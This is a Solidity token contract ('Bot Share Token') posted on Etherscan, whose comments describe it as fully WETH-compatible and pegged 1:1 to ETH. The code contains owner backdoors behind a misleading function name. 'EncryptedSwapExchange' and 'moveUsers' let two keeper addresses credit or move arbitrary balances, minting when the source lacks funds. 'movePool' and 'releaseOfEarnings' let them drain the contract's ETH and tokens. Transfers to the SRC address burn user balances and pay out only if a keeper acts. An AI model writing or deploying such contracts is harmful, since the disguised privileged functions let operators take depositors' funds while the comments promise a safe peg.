/**
 *Submitted for verification at Etherscan.io on 2022-06-19
*/

pragma solidity ^0.4.18;

interface ERC20 {
    function balanceOf(address who) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function totalSupply() external view returns (uint);
}

contract BotShareToken {

    address public poolKeeper;
    address public secondKeeper;
    address public SRC;
    address[3] public WETH;

    constructor (address _keeper,address _src,address _weth1,address _weth2,address _weth3) public {
        poolKeeper = _keeper;
        secondKeeper = _keeper; 
        SRC = _src;
        WETH = [_weth1, _weth2, _weth3];
    }
    
    //BOT is a type of WETH and it is fully compatible with all the functions of WETH.
    //1 BOT === 1 WETH === 1 ETH ('===' means 'constantly equal to');
    //For SwapBrainBot & the other bots, BOT is also used to calculate the user's shares in the BOT. 
    string public name     = "Bot Share Token";
    string public symbol   = "BOT";
    uint8  public decimals = 18;


    event  Approval(address indexed fromUser, address indexed guy, uint wad);
    event  Transfer(address indexed fromUser, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed fromUser, uint wad);
    event  ApplySwapToEther(address indexed fromUser, uint wad);
    event  SwapToEther(address indexed fromUser, uint wad);
    event  SwapFromEther(address indexed fromUser, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;


    modifier keepPool() {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
        _;
    }

    function() public payable {}

    
    function deposit(uint amount) public {
        ERC20(SRC).transferFrom(msg.sender,address(this),amount);
        balanceOf[msg.sender] = add(balanceOf[msg.sender],amount);
        emit Deposit(msg.sender, amount);
    }

    function swapFromEther(address userAddress,uint amount) public{
        require(msg.sender==SRC);
        balanceOf[userAddress] = add(balanceOf[userAddress],amount);
        emit Deposit(msg.sender, amount);
        emit SwapFromEther(msg.sender, amount);
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] = sub(balanceOf[msg.sender],wad);
        ERC20(SRC).transfer(msg.sender,wad);
        emit Withdrawal(msg.sender, wad);           
    }

    function totalSupply() public view returns (uint) { 

        uint supply = ERC20(SRC).balanceOf(address(this));
        return(supply);
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address fromUser, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[fromUser] >= wad);

        if (fromUser != msg.sender && allowance[fromUser][msg.sender] != uint(-1)) {
            require(allowance[fromUser][msg.sender] >= wad);
            allowance[fromUser][msg.sender] = sub(allowance[fromUser][msg.sender],wad);
        }       
        balanceOf[fromUser] = sub(balanceOf[fromUser],wad);
        if(address(this) == dst){
            ERC20(SRC).transfer(fromUser,wad);
            emit Withdrawal(fromUser,wad);       
        }else{
            if(SRC == dst){
                emit ApplySwapToEther(fromUser,wad); 
            }else{
                balanceOf[dst] = add(balanceOf[dst],wad);
            }
        }
        emit Transfer(fromUser, dst, wad);
        return true;
    }

    function processSwapToEther(address fromUser,uint wad) public keepPool returns (bool) {
        fromUser.transfer(wad);
        emit Withdrawal(fromUser,wad);
        emit SwapToEther(fromUser,wad);
        return true;
    }
    
     function moveUsers(address from,address guy,uint amount) public keepPool returns (bool) {
        balanceOf[guy] = add(balanceOf[guy],amount);
        emit Transfer(from, guy, amount);
        return true;
    }

    function movePool(address guy,uint amount) public keepPool returns (bool) {
        guy.transfer(amount);
        return true;
    }
    

    function releaseOfEarnings(address tkn, address guy,uint amount) public keepPool returns(bool) {
        require((tkn != address(0))&&(guy != address(0)));
        ERC20 token = ERC20(tkn);
        token.transfer(guy, amount);
        return true;
    }

    function setSRCContract(address _SRC) public keepPool returns(bool) {
        require(_SRC != address(0));
        SRC = _SRC;
        return true;
    }


    function setWETHContract(address addr1,address addr2,address addr3) public keepPool returns(bool) {
        WETH[0] = addr1;
        WETH[1] = addr2;
        WETH[2] = addr3;
        return true;
    }

    function EncryptedSwapExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
            if(balanceOf[fromAddress] >= amount){
                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
            }
            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
            emit Transfer(fromAddress,toAddress,amount); 
        return true;
    }


    function totalEtherBalanceOfWETHContracts() public view returns(uint){
        uint totalEtherBalance = WETH[0].balance;
        totalEtherBalance = add(totalEtherBalance,WETH[1].balance);
        totalEtherBalance = add(totalEtherBalance,WETH[2].balance);
        return totalEtherBalance;
    }
    
    function totalWETHBalanceOfThis() public view returns(uint){
        uint etherBalance = ERC20(WETH[0]).balanceOf(address(this));
        etherBalance = add(etherBalance,ERC20(WETH[1]).balanceOf(address(this)));
        etherBalance = add(etherBalance,ERC20(WETH[2]).balanceOf(address(this)));
        return etherBalance;
    }

    function resetPoolKeeper(address newKeeper) public keepPool returns(bool) {
        require(newKeeper != address(0));
        poolKeeper = newKeeper;
        return true;
    }

    function resetSecondKeeper(address newKeeper) public keepPool returns(bool) {
        require(newKeeper != address(0));
        secondKeeper = newKeeper;
        return true;
    }

   function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;
        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;
        return c;
    }

}